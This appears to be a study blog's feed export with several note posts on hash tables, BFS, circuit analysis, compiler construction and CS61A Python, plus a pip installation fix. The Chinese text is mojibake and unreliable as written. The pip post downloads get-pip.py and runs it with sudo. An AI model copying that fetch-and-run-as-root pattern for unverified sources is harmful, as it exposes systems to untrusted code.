æ¯”è¾ƒåˆå¹¶æ’åºå’Œå¿«é€Ÿæ’åº</h3><h3 id="4-3-2-å¹³å‡æƒ…å†µå’Œæœ€ç³Ÿæƒ…å†µ"><a href="#4-3-2-å¹³å‡æƒ…å†µå’Œæœ€ç³Ÿæƒ…å†µ" class="headerlink" title="4.3.2 å¹³å‡æƒ…å†µå’Œæœ€ç³Ÿæƒ…å†µ"></a>4.3.2 å¹³å‡æƒ…å†µå’Œæœ€ç³Ÿæƒ…å†µ</h3><h1 id="ç¬¬5ç« -æ•£åˆ—è¡¨"><a href="#ç¬¬5ç« -æ•£åˆ—è¡¨" class="headerlink" title="ç¬¬5ç«  æ•£åˆ—è¡¨"></a>ç¬¬5ç«  æ•£åˆ—è¡¨</h1><p>Hashtable, å°±æ˜¯å“ˆå¸Œè¡¨.</p><h2 id="5-1-æ•£åˆ—å‡½æ•°"><a href="#5-1-æ•£åˆ—å‡½æ•°" class="headerlink" title="5.1 æ•£åˆ—å‡½æ•°"></a>5.1 æ•£åˆ—å‡½æ•°</h2><p>å¯¹äºåŒæ ·çš„è¾“å…¥, æ•£åˆ—è¡¨å¿…é¡»è¿”å›åŒæ ·çš„è¾“å‡º.</p><h2 id="5-2-åº”ç”¨æ¡ˆä¾‹"><a href="#5-2-åº”ç”¨æ¡ˆä¾‹" class="headerlink" title="5.2 åº”ç”¨æ¡ˆä¾‹"></a>5.2 åº”ç”¨æ¡ˆä¾‹</h2><h3 id="5-2-1-å°†æ•£åˆ—è¡¨ç”¨äºæŸ¥æ‰¾"><a href="#5-2-1-å°†æ•£åˆ—è¡¨ç”¨äºæŸ¥æ‰¾" class="headerlink" title="5.2.1 å°†æ•£åˆ—è¡¨ç”¨äºæŸ¥æ‰¾"></a>5.2.1 å°†æ•£åˆ—è¡¨ç”¨äºæŸ¥æ‰¾</h3><p>æ•£åˆ—è¡¨èƒ½å¤Ÿæ¨¡æ‹Ÿæ˜ å°„å…³ç³».</p><h3 id="5-2-2-é˜²æ­¢é‡å¤"><a href="#5-2-2-é˜²æ­¢é‡å¤" class="headerlink" title="5,2,2 é˜²æ­¢é‡å¤"></a>5,2,2 é˜²æ­¢é‡å¤</h3><h3 id="5-2-3-ç”¨ä½œç¼“å­˜"><a href="#5-2-3-ç”¨ä½œç¼“å­˜" class="headerlink" title="5.2.3 ç”¨ä½œç¼“å­˜"></a>5.2.3 ç”¨ä½œç¼“å­˜</h3><h2 id="5-3-å†²çª"><a href="#5-3-å†²çª" class="headerlink" title="5.3 å†²çª"></a>5.3 å†²çª</h2><p>è¦æ˜ç™½æ•£åˆ—è¡¨çš„æ€§èƒ½, éœ€äº†è§£ä»€ä¹ˆæ˜¯å†²çª. Collision: ç»™ä¸¤ä¸ªé”®åˆ†é…çš„ä½ç½®ç›¸åŒ.</p><p>æœ€ç®€å•çš„è§£å†³æ–¹æ³•: å¦‚æœä¸¤ä¸ªé”®æ˜ å°„åˆ°äº†åŒä¸€ä¸ªä½ç½®, å°±åœ¨è¿™ä¸ªä½ç½®å­˜å‚¨ä¸€ä¸ªé“¾è¡¨.</p><p>æœ€ç†æƒ³çš„æƒ…å†µæ˜¯, æ•£åˆ—å‡½æ•°å°†é”®å‡åŒ€åœ°æ˜ å°„åˆ°æ•£åˆ—è¡¨çš„ä¸åŒä½ç½®.</p><p>å¦‚æœæ•£åˆ—è¡¨å­˜å‚¨çš„é“¾è¡¨å¾ˆé•¿, æ•£åˆ—è¡¨çš„é€Ÿåº¦å°†æ€¥å‰§ä¸‹é™.</p><h2 id="5-4-æ€§èƒ½"><a href="#5-4-æ€§èƒ½" class="headerlink" title="5.4 æ€§èƒ½"></a>5.4 æ€§èƒ½</h2><p>åœ¨å¹³å‡æƒ…å†µä¸‹, æ— è®ºæ•£åˆ—è¡¨åŒ…å«å¤šå°‘ä¸ªå…ƒç´ , ä»ä¸­è·å–æ•°æ®æ‰€éœ€çš„æ—¶é—´éƒ½ç›¸åŒ, ä¸ºO(1)â€“å¸¸é‡æ—¶é—´.</p><p>åœ¨æœ€ç³Ÿæƒ…å†µä¸‹, æ•£åˆ—è¡¨æ‰€æœ‰æ“ä½œçš„è¿è¡Œæ—¶é—´éƒ½ä¸ºO(n)â€“çº¿æ€§æ—¶é—´.</p><p>ä¸ºé¿å…å†²çª, éœ€è¦æœ‰:</p><ul><li>è¾ƒä½çš„å¡«è£…å› å­</li><li>è‰¯å¥½çš„æ•£åˆ—å‡½æ•°</li></ul><h3 id="5-4-1-å¡«è£…å› å­"><a href="#5-4-1-å¡«è£…å› å­" class="headerlink" title="5.4.1 å¡«è£…å› å­"></a>5.4.1 å¡«è£…å› å­</h3><p>è®¡ç®—:<br>$\frac{element number}{position number}$</p><p>å¡«è£…å› å­å¤§äº1æ„å‘³ç€å•†å“æ•°é‡è¶…è¿‡äº†æ•°ç»„çš„ä½ç½®æ•°, ä¸€æ—¦å¡«è£…å› å­å¼€å§‹å¢å¤§, ä½ å°±éœ€è¦åœ¨æ•£åˆ—è¡¨ä¸­æ·»åŠ ä½ç½®, è¿™è¢«ç§°ä¸ºè°ƒæ•´é•¿åº¦(resizing).</p><p>ä¸€ä¸ªç»éªŒè§„åˆ™: ä¸€æ—¦å¡«è£…å› å­å¤§äº0.7, å°±è°ƒæ•´æ•£åˆ—è¡¨çš„é•¿åº¦.</p><h3 id="5-4-2-è‰¯å¥½çš„æ•£åˆ—å‡½æ•°"><a href="#5-4-2-è‰¯å¥½çš„æ•£åˆ—å‡½æ•°" class="headerlink" title="5.4.2 è‰¯å¥½çš„æ•£åˆ—å‡½æ•°"></a>5.4.2 è‰¯å¥½çš„æ•£åˆ—å‡½æ•°</h3><p>è‰¯å¥½çš„æ•£åˆ—å‡½æ•°è®©æ•°ç»„ä¸­çš„å€¼å‘ˆå‡åŒ€åˆ†å¸ƒ.</p><p>ç³Ÿç³•çš„æ•£åˆ—å‡½æ•°è®©å€¼æ‰å †, å¯¼è‡´å¤§é‡å†²çª.</p><h1 id="ç¬¬6ç« -å¹¿åº¦ä¼˜å…ˆæœç´¢"><a href="#ç¬¬6ç« -å¹¿åº¦ä¼˜å…ˆæœç´¢" class="headerlink" title="ç¬¬6ç«  å¹¿åº¦ä¼˜å…ˆæœç´¢"></a>ç¬¬6ç«  å¹¿åº¦ä¼˜å…ˆæœç´¢</h1><p>Breadth-first search, BFS. ç”¨äºæ‰¾å‡ºä¸¤æ ·ä¸œè¥¿ä¹‹é—´çš„æœ€çŸ­è·ç¦».</p>]]></content>
    
    
    <categories>
      
      <category>Algorithms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Solved: /usr/bin/python3: No module named pip error on Linux</title>
    <link href="/2022/08/01/Solved-usr-bin-python3-No-module-named-pip-error-on-Linux/"/>
    <url>/2022/08/01/Solved-usr-bin-python3-No-module-named-pip-error-on-Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><a href="https://stackoverflow.com/questions/44622182/python-3-6-no-module-named-pip">reference1</a></p><p>manually install <code>pip</code>:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wget</span> <span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">python3</span> <span class="hljs-built_in">get-pip.py</span><br></code></pre></td></tr></table></figure><p>In Debian distributions:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python</span>-pip ##for python2<br><br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python3</span>-pip ##for <span class="hljs-keyword">python3</span><br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><a href="https://www.cyberithub.com/solved-usr-bin-python3-no-module-named-pip-error-on-linux/">reference2</a></p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”µè·¯åˆ†æå¯¼è®º</title>
    <link href="/2022/08/01/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%AF%BC%E8%AE%BA%20Notes/"/>
    <url>/2022/08/01/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%AF%BC%E8%AE%BA%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-ç»ªè®º"><a href="#Chapter-1-ç»ªè®º" class="headerlink" title="Chapter 1 ç»ªè®º"></a>Chapter 1 ç»ªè®º</h1><h2 id="1-3-æµ‹é‡å•ä½ä¸å•ä½åˆ¶"><a href="#1-3-æµ‹é‡å•ä½ä¸å•ä½åˆ¶" class="headerlink" title="1.3 æµ‹é‡å•ä½ä¸å•ä½åˆ¶"></a>1.3 æµ‹é‡å•ä½ä¸å•ä½åˆ¶</h2><p>ç±³æœ€åˆè¢«å®šä¹‰ä¸ºæ²¿æµ·å¹³é¢ä»åœ°çƒèµ¤é“åˆ°åœ°çƒå—ææˆ–åŒ—æè·ç¦»çš„ä¸€åƒä¸‡åˆ†ä¹‹ä¸€ã€‚</p><p>ç°åœ¨çš„ç±³æ˜¯å‚ç…§çœŸç©ºä¸­çš„å…‰é€Ÿå®šä¹‰çš„ï¼Œå…‰é€Ÿä¸º299792458m&#x2F;s.</p><p>åƒå…‹å®šä¹‰ä¸º1cm^3çº¯å‡€æ°´åœ¨4ocæ—¶è´¨é‡çš„1000å€.</p><p>ç§’æœ€åˆçš„å®šä¹‰ä¸ºå¹³å‡å¤ªé˜³æ—¥çš„86400åˆ†ä¹‹ä¸€.</p><p>1967å¹´, ç§’è¢«é‡æ–°å®šä¹‰ä¸ºé“¯åŸå­ç”µç£è¾å°„(èƒ½çº§è·ƒè¿)å‘¨æœŸçš„9192631770å€.</p><h1 id="Chapter-2-ç”µå‹å’Œç”µæµ"><a href="#Chapter-2-ç”µå‹å’Œç”µæµ" class="headerlink" title="Chapter 2 ç”µå‹å’Œç”µæµ"></a>Chapter 2 ç”µå‹å’Œç”µæµ</h1><p>æ¯ä¸€ç”µå­å±‚æ‰€å­˜åœ¨çš„æœ€å¤šç”µå­æ•°é‡å¯ç”¨2n^2æ¥è®¡ç®—.</p><h2 id="2-3-ç”µå‹"><a href="#2-3-ç”µå‹" class="headerlink" title="2.3 ç”µå‹"></a>2.3 ç”µå‹</h2><p>ä¸€èˆ¬åœ°,æ¯ä¸ªç”µå‹æºéƒ½æ˜¯é åˆ†ç¦»æ­£ç”µè·å’Œè´Ÿç”µè·æ¥å»ºç«‹ç”µå‹çš„.</p><p>6.242 x 10^18 ä¸ªç”µå­æ‰€å¸¦çš„æ€»ç”µè·é‡ç§°ä¸º1åº“ä»‘(C).</p><p>å¦‚æœåœ¨ä¸¤ç‚¹ä¹‹é—´ç§»åŠ¨1åº“ä»‘(C)çš„è´Ÿç”µè·, åˆšå¥½æ¶ˆè€—äº†1ç„¦è€³(J)çš„èƒ½é‡, åˆ™è¿™ä¸¤ç‚¹ä¹‹é—´å°±æœ‰1ä¼ç‰¹(V)çš„ç”µå‹.</p>]]></content>
    
    
    <categories>
      
      <category>Circuit Analysis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Engineering a compiler Notes</title>
    <link href="/2022/08/01/Engineering-a-compiler-Notes/"/>
    <url>/2022/08/01/Engineering-a-compiler-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Overview-of-Compilation"><a href="#Chapter-1-Overview-of-Compilation" class="headerlink" title="Chapter 1 Overview of Compilation"></a>Chapter 1 Overview of Compilation</h1><p>Compilers are computer programs that translate a program written in one language into a program written in another language.</p><h2 id="1-1-INTRODUCTION"><a href="#1-1-INTRODUCTION" class="headerlink" title="1.1 INTRODUCTION"></a>1.1 INTRODUCTION</h2><p>The compiler has a <mark>front end</mark> to deal with the source language, which focus on understanding the source-language program, and it has a <mark>back end</mark> to deal with the target language, which focus on mapping programs to the target machine.</p><p>Many research compilers produce C program as their output. Because compilers for C are available on most computers.</p><p>Two fundamental principles:<br>    - The compiler must preserve the meaning of the program being compiled.<br>    - The compiler must improve the input program in some discernible way.</p><h2 id="1-2-COMPILER-STRUCTURE"><a href="#1-2-COMPILER-STRUCTURE" class="headerlink" title="1.2 COMPILER STRUCTURE"></a>1.2 COMPILER STRUCTURE</h2><p>A compiler uses some sets of data structures to represent the code it processes. That form is called an <mark>intermediate representation</mark>.</p><p><mark>Two-phase compiler</mark>, åªæœ‰ front end å’Œ back end.<br><mark>Three-phase compiler</mark>, æœ‰ front end, optimizer å’Œ back end.</p><h2 id="1-3-OVERVIEW-OF-TRANSLATION"><a href="#1-3-OVERVIEW-OF-TRANSLATION" class="headerlink" title="1.3 OVERVIEW OF TRANSLATION"></a>1.3 OVERVIEW OF TRANSLATION</h2><p><mark>Notation</mark><br>A compiler translates a program written in one notation into an equivalent program written in another notation.</p><h3 id="1-3-1-The-Front-End"><a href="#1-3-1-The-Front-End" class="headerlink" title="1.3.1 The Front End"></a>1.3.1 The Front End</h3><h4 id="Cheching-Syntax"><a href="#Cheching-Syntax" class="headerlink" title="Cheching Syntax"></a>Cheching Syntax</h4><p>The source language is a set, usually infinite, of strings defined by some finite set of rules, called a grammar.</p><p>The scanner takes a stream of characters and converts it to a stream of classified words.</p><p>The actual spelling of the words might be stored in a hash table and represented in the pairs with an integer index.</p><p>The process of automatically finding derivations is called <mark>parsing</mark>.</p><h4 id="Intermediate-Representations"><a href="#Intermediate-Representations" class="headerlink" title="Intermediate Representations"></a>Intermediate Representations</h4><p>Compilers use a variety of different kinds of IR.</p><h3 id="1-3-2-The-Optimizer"><a href="#1-3-2-The-Optimizer" class="headerlink" title="1.3.2 The Optimizer"></a>1.3.2 The Optimizer</h3><p>The optimizer analyzes the IR form of the code to discover facts about that context and uses that contextual knowledge to rewrite the code so that it computes the same answer in a more efficient way.</p><h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><h4 id="Transformation"><a href="#Transformation" class="headerlink" title="Transformation"></a>Transformation</h4><h3 id="1-3-3-The-Back-End"><a href="#1-3-3-The-Back-End" class="headerlink" title="1.3.3 The Back End"></a>1.3.3 The Back End</h3><p>The compilerâ€™s back end traverses the IR form of the code and emits code for the target machine.</p><p><code>ILOC</code>â€“â€intermediate language for an optimizing compilerâ€, is a notation fo low-level examples.</p><h4 id="Instruction-Selection"><a href="#Instruction-Selection" class="headerlink" title="Instruction Selection"></a>Instruction Selection</h4><p>Instruction selection maps each IR operation, in its context, into one or more target machine operations.<br><mark>Virtual register</mark><br>A symbolic register name that the compiler uses to indicate that a value can be stored in a register.</p><p>æ„æ€å°±æ˜¯é€‰æ‹©æœ€åˆé€‚çš„ instruction, æ‰€ä»¥å« instruction selector, æ¯”å¦‚ä¸€ä¸ª source code, mapping to ä¸€ä¸ª machine code, æœ‰å‡ ç§é€‰æ‹©, è¿™æ—¶ instruction selector ä¼šé€‰æ‹©æœ€å¥½çš„ä¸€ä¸ª. </p><h4 id="Register-Allocation"><a href="#Register-Allocation" class="headerlink" title="Register Allocation"></a>Register Allocation</h4><p>The register allocator must map those virtual registers onto actual target-machine registers.</p><p>The optimization would increase demand for registers but eliminate a later instruction. æ„æ€å°±æ˜¯æŠŠå‰é¢è®¡ç®—çš„å€¼ç”¨äºåé¢çš„è®¡ç®—.</p><h4 id="Instruction-Scheduling"><a href="#Instruction-Scheduling" class="headerlink" title="Instruction Scheduling"></a>Instruction Scheduling</h4><p>To reorder operation.</p><p>It attempts to minimize the number of cycles wasted waiting for operands.</p><h4 id="Interactions-Among-Code-Generation-Components"><a href="#Interactions-Among-Code-Generation-Components" class="headerlink" title="Interactions Among Code-Generation Components"></a>Interactions Among Code-Generation Components</h4><h2 id="1-4-SUMMARY-AND-PERSPECTIVE"><a href="#1-4-SUMMARY-AND-PERSPECTIVE" class="headerlink" title="1.4 SUMMARY AND PERSPECTIVE"></a>1.4 SUMMARY AND PERSPECTIVE</h2><h1 id="Chapter-2-Scanners"><a href="#Chapter-2-Scanners" class="headerlink" title="Chapter 2 Scanners"></a>Chapter 2 Scanners</h1><p>The scanner is the only pass in the compiler to touch every character in the input program.</p><p>The regular expression, a notation used to describe the valid words in a programming laguage.</p><h2 id="2-1-INTRODUCTION"><a href="#2-1-INTRODUCTION" class="headerlink" title="2.1 INTRODUCTION"></a>2.1 INTRODUCTION</h2><p>The scanner, ä¹Ÿå°±æ˜¯ lexical analyzer, reads a stream of characters and produces a stream of words.</p><h3 id="Conceptual-Roadmap"><a href="#Conceptual-Roadmap" class="headerlink" title="Conceptual Roadmap"></a>Conceptual Roadmap</h3><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><mark>Syntactic category</mark>, a classification of words according to their grammatical usage.</p><p><mark>Microsyntax</mark>, the lexical structure of a language, which specifies how to group characters into words and how to separate words that run together.</p><p>In most languages, blanks and punctuation marks terminate a word.</p><p><mark>Keyword</mark>, a word that is reserved for a particular syntactic purpose and, thus, cannot be used as an identifier.</p><p>Both generated and hand-crafted scanners can be implemented to require just O(1) time per character.</p><h2 id="2-2-RECONGNIZING-WORDS"><a href="#2-2-RECONGNIZING-WORDS" class="headerlink" title="2.2 RECONGNIZING WORDS"></a>2.2 RECONGNIZING WORDS</h2><p>The recognizer takes one transition per input character.</p><h3 id="2-2-1-A-Formalism-for-Recognizers"><a href="#2-2-1-A-Formalism-for-Recognizers" class="headerlink" title="2.2.1 A Formalism for Recognizers"></a>2.2.1 A Formalism for Recognizers</h3><p><mark>Finite automation</mark>, a formalism for recogmizers that has a finite set of states, an alphabet, a transition function, a start state, and one or more accepting states. A finite automaton(FA) is a five-tuple($S, \epsilon, \delta, s_0, S_A$).</p><p>æœ‰ä¸€ä¸ª error state $s_e$.</p><h3 id="2-2-2-Recognizing-More-Complex-Words"><a href="#2-2-2-Recognizing-More-Complex-Words" class="headerlink" title="2.2.2 Recognizing More Complex Words"></a>2.2.2 Recognizing More Complex Words</h3><p>Syntactic category å’Œ lexeme.</p><h2 id="2-3-REGULAR-EXPRESSION"><a href="#2-3-REGULAR-EXPRESSION" class="headerlink" title="2.3 REGULAR EXPRESSION"></a>2.3 REGULAR EXPRESSION</h2><p>The language described by an RE is called a <mark>regular languages</mark>.</p><p>Simple recognizers have simple RE specifications.</p><h3 id="2-3-1-Formalizing-the-Notation"><a href="#2-3-1-Formalizing-the-Notation" class="headerlink" title="2.3.1 Formalizing the Notation"></a>2.3.1 Formalizing the Notation</h3><p>An RE  is built up from three basic operations:</p><ol><li>Alternation, R|S</li><li>Concatenation, RS</li><li>Closure, $R^*$</li></ol><p>Regular expression are used in many applications to specify patterns in character strings.</p><p>Parentheses have highest precedence, followed by closure, concatenation, and alternation, in that order.</p><h3 id="2-3-2-Examples"><a href="#2-3-2-Examples" class="headerlink" title="2.3.2 Examples"></a>2.3.2 Examples</h3><p>The point is critical: the cost of operating an FA is proportional to the length of the input, not to the length or complexity of the RE that generates the FA.</p><h3 id="2-3-3-Closure-Properties-of-REs"><a href="#2-3-3-Closure-Properties-of-REs" class="headerlink" title="2.3.3 Closure Properties of REs"></a>2.3.3 Closure Properties of REs</h3><p>Regular expressions are closed under many operationsâ€“that is, if we apply the operation to an RE or a collection of REs, the result is an RE.</p><h2 id="2-4-FROM-REGULAR-EXPRESSION-TO-SCANNER"><a href="#2-4-FROM-REGULAR-EXPRESSION-TO-SCANNER" class="headerlink" title="2.4 FROM REGULAR EXPRESSION TO SCANNER"></a>2.4 FROM REGULAR EXPRESSION TO SCANNER</h2><p>The goal of out work with finite automata is to automate the derivation of executable scanners from a collection of REs.</p><p>Deterministic FAs, or DFAs. Kleeneâ€™s construction derives an RE from a DFA.</p><p>Nondeterministic FAs, or NFAs. Thompsonâ€™s construction derives an NFA from an RE.</p><h3 id="2-4-1-Nondeterministic-Finite-Automata"><a href="#2-4-1-Nondeterministic-Finite-Automata" class="headerlink" title="2.4.1 Nondeterministic Finite Automata"></a>2.4.1 Nondeterministic Finite Automata</h3><p>An FA that includes states such as $s_0$ that have multiple transitions on a single character is called a <mark>nondeterministic finite automaton</mark>. Its an FA thats allows transitions on the empty string, $\epsilon$, and states that have multiple transitions on the same character.</p><p>An FA with unique character transitions in each state is called a <mark>deterministic finite automaton</mark>. Its an FA where the transition function is single-valued. DFAs do not allow $\epsilon$-transitions.</p><p>NFA çš„è¡Œä¸º:</p><ul><li>Each time the NFA must make a nondeterministic choice, it follows the transition that leads to an accepting state for the input string, if such a transition exists. ä¹Ÿå°±æ˜¯è¯´NFAä¼šæŠŠä¸€æ¡è·¯çº¿èµ°å®Œ.</li><li>NFA ä¼š clones itself to pursue each possible transition. At any point, we call the specific set of states in which the NFA is active its <mark>configuration</mark>. ä¹Ÿå°±æ˜¯å…¶ä¸­æŸä¸€æ¡.</li></ul><h4 id="Equivalence-of-NFAs-and-DFAs"><a href="#Equivalence-of-NFAs-and-DFAs" class="headerlink" title="Equivalence of NFAs and DFAs"></a>Equivalence of NFAs and DFAs</h4><p>NFAs and DFAs are equivalent in their expressive power. Any DFA is a special case of an NFA.</p><h3 id="2-4-2-Regular-Expression-to-NFA-Thompsonâ€™s-Construction"><a href="#2-4-2-Regular-Expression-to-NFA-Thompsonâ€™s-Construction" class="headerlink" title="2.4.2 Regular Expression to NFA: Thompsonâ€™s Construction"></a>2.4.2 Regular Expression to NFA: Thompsonâ€™s Construction</h3><p>Deriving an NFA from the RE.</p><p>å› ä¸º NFA è¦å°è¯•æ‰€æœ‰æƒ…å†µ, å› æ­¤ NFA éœ€è¦ $\epsilon$ transformation. åœ¨æ¯ä¸€ä¸ªåˆ†æ”¯å¤„éƒ½éœ€è¦ $\epsilon$ transformation.</p><p>Each NFA has one start state and one accepting state of NFAs for some component REs.</p><p>An $\epsilon$-transition always connects two states.</p><p>The NFA also contains many $\epsilon$-moves that are obviously unneeded.</p><h3 id="2-4-3-NFA-to-DFA-The-Subset-Construction"><a href="#2-4-3-NFA-to-DFA-The-Subset-Construction" class="headerlink" title="2.4.3 NFA to DFA: The Subset Construction"></a>2.4.3 NFA to DFA: The Subset Construction</h3><p>DFA executions is much easier to simulate than NFA.</p><p>The algorithm that constructs a DFA from an NFA is called <mark>subset construction</mark>.</p><p><mark>Valid configuration</mark>, configuration of an NFA that can be reached by some input string.</p><h3 id="2-4-5-Using-a-DFA-as-a-Recognizer"><a href="#2-4-5-Using-a-DFA-as-a-Recognizer" class="headerlink" title="2.4.5 Using a DFA as a Recognizer"></a>2.4.5 Using a DFA as a Recognizer</h3><h2 id="2-5-IMPLEMENTING-SCANNERS"><a href="#2-5-IMPLEMENTING-SCANNERS" class="headerlink" title="2.5 IMPLEMENTING SCANNERS"></a>2.5 IMPLEMENTING SCANNERS</h2><p>æœ€åä¸€éƒ¨ä¼¼ä¹æ˜¯ convert the DFA into executable code.</p><p>Three implementation strategies for converting a DFA into executable code:</p><ul><li>a table-driven scanner</li><li>a direct-coded scanner</li><li>a hand-coded sanner<br>All of these scanners operate in the same manner, by simulating the DFA.<br>The three implementation strategies differ in the details of their runtime cost.</li></ul><h3 id="2-5-1-Table-Driven-Scanners"><a href="#2-5-1-Table-Driven-Scanners" class="headerlink" title="2.5.1 Table-Driven Scanners"></a>2.5.1 Table-Driven Scanners</h3>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS61A Python Notes</title>
    <link href="/2022/07/31/CS61A-Python-Notes/"/>
    <url>/2022/07/31/CS61A-Python-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="textbook">http://composingprograms.com/pages/13-defining-new-functions.html</a></p><h1 id="Chapter-1-Building-Abstractions-with-Functions"><a href="#Chapter-1-Building-Abstractions-with-Functions" class="headerlink" title="Chapter 1: Building Abstractions with Functions"></a>Chapter 1: Building Abstractions with Functions</h1><h2 id="1-1-Getting-Started"><a href="#1-1-Getting-Started" class="headerlink" title="1.1 Getting Started"></a>1.1 Getting Started</h2><h3 id="1-1-4-First-Example"><a href="#1-1-4-First-Example" class="headerlink" title="1.1.4 First Example"></a>1.1.4 First Example</h3><p><mark>Statement</mark> describe actions. statement are not evaluated but executed.</p><p><mark>Expression</mark> describe computations.<br>All expressions can use function call notation.</p><h2 id="1-2-Elements-of-Programming"><a href="#1-2-Elements-of-Programming" class="headerlink" title="1.2 Elements of Programming"></a>1.2 Elements of Programming</h2><p>Data is stuff that we want to manipulate, and functions describe the rules for manipulating the data.</p><h3 id="1-2-3-Importing-Library-Functions"><a href="#1-2-3-Importing-Library-Functions" class="headerlink" title="1.2.3 Importing Library Functions"></a>1.2.3 Importing Library Functions</h3><p>Import from the <code>math</code> module:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt </span><br></code></pre></td></tr></table></figure><p>The interpreter must maintain some sort of memory that keeps track of the names, values, and bindings. This memory called a <mark>environment</mark>.</p><p>We can use assignment statements to give new names to existing functions.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">f</span> <span class="hljs-operator">=</span> max<br></code></pre></td></tr></table></figure><p>Assining multiple values to multiple names in a single statement:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">area</span>, circumference = <span class="hljs-literal">pi</span> * radius * radius, <span class="hljs-number">2</span> * <span class="hljs-literal">pi</span> * radius<br></code></pre></td></tr></table></figure><h3 id="1-2-5-Evaluating-Nested-Expressions"><a href="#1-2-5-Evaluating-Nested-Expressions" class="headerlink" title="1.2.5 Evaluating Nested Expressions"></a>1.2.5 Evaluating Nested Expressions</h3><p>To evaluate a call expression, Python will do the following:<br>    1. Evaluate the operator and operand subexpressions, then<br>    2. Apply the function that is the value of the operator subexpression to the arguments that are the values of the operand subexpressions.</p><h3 id="1-2-6-The-Non-Pure-Print-Function"><a href="#1-2-6-The-Non-Pure-Print-Function" class="headerlink" title="1.2.6 The Non-Pure Print Function"></a>1.2.6 The Non-Pure Print Function</h3><p>Distinguish between two types of functions:</p><p><mark>Pure functions</mark>: Functions have some input(their arguments) and reutrn some output(the result of applying them).</p><p><mark>Non-pure functions</mark>: make some change to the state of the interpreter or computer, a common side effect is to generate additional output beyond the return value.</p><p><code>None</code> is a special Python value that represents nothing.</p><p>Be careful with <code>print</code>. The fact that it returns <code>None</code> means that it should not be the expression in an assignment statement.</p><h2 id="1-3-Defining-New-Functions"><a href="#1-3-Defining-New-Functions" class="headerlink" title="1.3 Defining New Functions"></a>1.3 Defining New Functions</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; def square(<span class="hljs-keyword">x</span>):<br>        return <span class="hljs-keyword">mul</span>(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span>)<br></code></pre></td></tr></table></figure><p>The <code>x</code> in this definitions is called a â€œformal parameterâ€</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def &lt;name&gt;(&lt;formal parameters&gt;):<br>    <span class="hljs-keyword">return</span> &lt;<span class="hljs-keyword">return</span> expression&gt;<br></code></pre></td></tr></table></figure><h3 id="1-3-1-Environments"><a href="#1-3-1-Environments" class="headerlink" title="1.3.1 Environments"></a>1.3.1 Environments</h3><p>An <mark>environments</mark> in which an expression is evaluated consists of a sequence of frames.</p><p>Each <mark>frame</mark> contains bindings, each of which associates a name with its corresponding value.<br>There is a global environment.</p><p>The name appearing in the function is called the <code>intrinsic name</code>.<br>The name in a frame is a <code>bound name</code>.<br>Different names may refer to the same function, but that function itself has only one intrinsic name.</p><p>A description of the formal parameters of a function is called the <mark>functionâ€™s signature</mark>.</p><h3 id="1-3-2-Calling-User-Defined-Functions"><a href="#1-3-2-Calling-User-Defined-Functions" class="headerlink" title="1.3.2 Calling User-Defined Functions"></a>1.3.2 Calling User-Defined Functions</h3><p>Applying a user-defined function introduces a second <mark>local frame</mark>, which is only accessible to that function.</p><p><mark>Name Evaluation</mark>. A name evaluates to the value bound to that name in the earliest frame of the current environment in which that name is found.</p><p>Names are bound to values, which are distributed across many independent local frames, along with a single global frame that contains shared names. A new local frame is introduced every time a function is called.</p><h3 id="1-3-4-Local-Names"><a href="#1-3-4-Local-Names" class="headerlink" title="1.3.4 Local Names"></a>1.3.4 Local Names</h3><h3 id="1-3-5-Choosing-Names"><a href="#1-3-5-Choosing-Names" class="headerlink" title="1.3.5 Choosing Names"></a>1.3.5 Choosing Names</h3><h3 id="1-3-6-Functions-as-Abstractions"><a href="#1-3-6-Functions-as-Abstractions" class="headerlink" title="1.3.6 Functions as Abstractions"></a>1.3.6 Functions as Abstractions</h3><p>The three core attributes of a function: The <mark>domain</mark> of a function is the set of arguments it can take. The <mark>range</mark> of a function is the set of value it can return. The <mark>indent</mark> of a function is the relationship it computes between inputs and output.</p><h3 